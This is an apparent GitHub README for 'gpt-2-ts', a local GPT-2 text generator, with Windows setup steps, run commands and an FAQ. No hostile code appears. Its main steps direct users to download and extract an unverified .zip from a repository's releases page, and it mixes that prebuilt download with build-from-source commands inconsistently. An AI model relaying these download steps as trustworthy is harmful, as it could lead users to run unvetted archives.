# 🤖 gpt-2-ts - Run custom artificial intelligence models locally

[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/alirizaguraras186-ai/gpt-2-ts/releases)

## What this program does

This application allows you to run GPT-2 text generation on your own computer. You do not need an internet connection to generate text once you install the software. It uses your computer hardware to process language data. This ensures your inputs remain private and stay on your machine. You can use the software to draft documents, brainstorm ideas, or test how language models function at a small scale.

## System requirements

To run this application on Windows, you need the following items:

* A 64-bit version of Windows 10 or Windows 11.
* At least 8 gigabytes of system memory (RAM).
* A solid-state drive (SSD) with 5 gigabytes of free disk space.
* An active internet connection for the initial setup process.

## 📥 Downloading the software

You must first download the program files to your computer. Follow these steps to obtain the correct version:

1. Click the following link: [Download GPT-2 for Windows](https://github.com/alirizaguraras186-ai/gpt-2-ts/releases).
2. Look for the section labeled "Assets."
3. Select the file ending in `.zip` that matches your system.
4. Save the file to your "Downloads" folder.
5. Right-click the downloaded file and select "Extract All."
6. Open the newly created folder to see the application files.

## ⚡ Setting up your environment

The software relies on standard components to function. Please ensure you have these tools installed on your system.

### Install Node.js
1. Go to the [official Node.js website](https://nodejs.org/).
2. Download the Long Term Support (LTS) installer.
3. Run the installer and click "Next" through each screen.
4. Keep the default settings during the process.
5. Restart your computer after the installation finishes.

### Install Python components
1. Download the Python installer from the official website.
2. Select the option labeled "Add Python to PATH" before you click "Install Now."
3. Open your Command Prompt by typing "cmd" into your Windows search bar.
4. Type `pip install uv` and press Enter to install the necessary tools.

## 🚀 Running the application

Once you extract the files and install the requirements, you can start the text generator.

1. Open the folder where you extracted the software.
2. Click the empty space in the folder path bar at the top of the window.
3. Type `cmd` and press Enter. A black window will appear.
4. Type `npm install` to prepare the internal files.
5. Navigate to the folder named "convert" by typing `cd convert` inside your command window.
6. Type `uv sync` to prepare the model data.
7. Type `uv run python download_model.py 124M` to pull the base model.
8. Type `uv run python convert.py --model 124M --clean` to finalize the data.
9. Close the conversion prompts once the process completes.

## 🛠 Using the tool

The software operates as a command-line utility. It reads the model data and generates responses based on your input.

* The program uses a small model by default. This ensures fast performance on standard laptops.
* You can change the model size if you have more memory available.
* The system saves the model data in a local folder labeled "tensors."
* Do not move or delete any files inside the "tensors" folder. The program needs these specific files to generate text correctly.

## 🛠 Troubleshooting issues

If the application fails to run, check these common items:

* **File Paths:** Ensure the folder name does not contain special characters or symbols.
* **Permissions:** Make sure your user account has permission to read and write files in the folder.
* **Python Path:** If the computer says "python is not found," reinstall Python and ensure you check the "Add to PATH" box.
* **Memory Limits:** If the window closes immediately, free up space in your RAM by closing your web browser or other memory-intensive applications.
* **Disk Space:** Check that you have enough space on your drive for the model files. Large models require significantly more space than the 124M version.

## Frequently asked questions

**Do I need an internet connection to generate text?**
No. After you perform the initial setup and download the model files, the software works offline.

**Does this software store my data?**
No. The application runs locally on your machine. All processing happens within your system memory.

**Can I stop the program while it generates text?**
Yes. You can press the "Ctrl" and "C" keys at the same time on your keyboard to stop the program at any moment.

**How do I update the software?**
Visit the download page again and extract the new files over the old ones. Ensure you keep your "tensors" folder if you do not want to download the model data again.